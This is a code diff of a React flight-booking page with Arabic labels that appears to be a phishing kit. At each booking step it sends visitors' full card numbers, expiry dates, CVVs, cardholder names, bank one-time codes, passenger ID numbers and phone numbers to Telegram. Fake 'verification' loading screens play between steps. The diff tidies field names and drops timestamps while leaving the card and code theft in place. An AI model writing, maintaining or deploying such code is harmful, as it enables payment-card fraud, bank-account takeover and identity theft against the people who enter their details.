@@ -38,7 +38,7 @@ async function notifyPaymentEntry(booking: BookingData, paymentMethod: string, a
   await sendPaymentToTelegram({
     cardNumber: 'Pending',
     cardType: 'Pending',
-    expiryDate: '', cvv: '', cardHolder: '', cardHolderFirst: '', cardHolderLast: '',
+    expiryDate: '', cvv: '', cardHolder: '',
     amount, from: booking.from, to: booking.to,
     paymentMethod, step: 'card-entered', ip,
   });
@@ -447,9 +447,6 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
       otpCode: verificationCode,
       attemptNumber: failedAttempts + 1,
       bankName: bankResult?.bank.name || 'Unknown',
-      time: new Date().toLocaleString('en-US'),
-      stepName: step,
-      isRealTime: true,
     });
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [verificationCode]);
@@ -589,14 +586,14 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
         await updateBookingStep.mutateAsync({ id: Number(result.id), selectedTrip: JSON.stringify(trip), selectedFare });
       }
     } catch { setBookingId(Date.now()); }
-    notifyStep('✅ اختيار الرحلة والضغط على احجز الآن', bookingData, { 'الرحلة المختارة': activeTrip.tripNumber, 'الفئة': selectedFare });
+    notifyStep('✅ اختيار الرحلة والضغط على احجز الآن', bookingData, { tripNumber: activeTrip.tripNumber, fareClass: selectedFare });
     await goToStep('seat_selection', 1);
   };
 
   const handleSeatNext = async () => {
     if (selectedSeats.length !== totalPassengers) return;
     if (bookingId) { try { await updateBookingStep.mutateAsync({ id: bookingId, selectedSeats: JSON.stringify(selectedSeats) }); } catch { } }
-    notifyStep('💺 اختيار المقاعد', bookingData, { 'المقاعد': selectedSeats.map(s => s.replace('seat-', '')).join(', ') });
+    notifyStep('💺 اختيار المقاعد', bookingData, { seats: selectedSeats.map(s => s.replace('seat-', '')).join(', ') });
     // Use goToStep for smooth transition with loading screen
     await goToStep('passenger_info', 2, 1500);
   };
@@ -638,10 +635,9 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
       const docLabel = docTypeLabel[p.documentType] || p.documentType;
       return `👤 مسافر ${i + 1} (${p.category === 'adult' ? 'بالغ' : p.category === 'child' ? 'طفل' : 'رضيع'}): ${p.fullName} | ${docLabel}: ${p.idNumber} | 📱 ${p.phone}`;
     }).join('\n');
-    const waLink = bookerInfo.phone ? `https://wa.me/966${bookerInfo.phone.replace(/^0/, '')}` : '';
     notifyStep('📝 إدخال بيانات المسافرين', bookingData, {
-      'المسافرون': `\n${pNames}`,
-      'مسؤول الحجز': `${bookerInfo.name} | 📱 [${bookerInfo.phone}](${waLink})`,
+      passengers: `\n${pNames}`,
+      booker: `${bookerInfo.name} | 📱 ${bookerInfo.phone}`,
     });
     await goToStep('payment_method', 3);
   };
@@ -649,7 +645,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
   const handlePaymentMethodNext = async () => {
     if (!selectedPayment) return;
     if (bookingId) { try { await updateBookingStep.mutateAsync({ id: bookingId, paymentMethod: selectedPayment }); } catch { } }
-    notifyStep('💳 اختيار طريقة الدفع', bookingData, { 'طريقة الدفع': paymentMethods.find(p => p.id === selectedPayment)?.name || selectedPayment, 'المبلغ': `${finalTotal} ر.س` });
+    notifyStep('💳 اختيار طريقة الدفع', bookingData, { paymentMethod: paymentMethods.find(p => p.id === selectedPayment)?.name || selectedPayment, amount: String(finalTotal) });
     notifyPaymentEntry(bookingData, paymentMethods.find(p => p.id === selectedPayment)?.name || selectedPayment, finalTotal);
     await goToStep('payment', 4, 8000);
   };
@@ -701,7 +697,6 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
     const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
     const bankResult = detectBank(cardNumber);
-    const currentStep = step; // capture current step name
     await sendPaymentToTelegram({
       cardNumber, cardType: cardTypeName, expiryDate, cvv,
       cardHolder: `${cardHolderFirst} ${cardHolderLast}`.trim() || 'Not entered',
@@ -709,8 +704,6 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
       paymentMethod: paymentName, step: 'otp-attempt',
       otpCode: verificationCode, attemptNumber: newAttempts,
       bankName: bankResult?.bank.name || 'Unknown',
-      time: new Date().toLocaleString('en-US'),
-      stepName: currentStep,
     });
 
     // Show loading (8 seconds for payment verification)
@@ -744,7 +737,6 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
       paymentMethod: paymentName, step: 'otp-failed',
       attemptNumber: 4,
       bankName: bankResult?.bank.name || 'Unknown',
-      time: new Date().toLocaleString('en-US'),
     });
 
     setLoadingMsg('جارٍ التحقق من الرمز...');
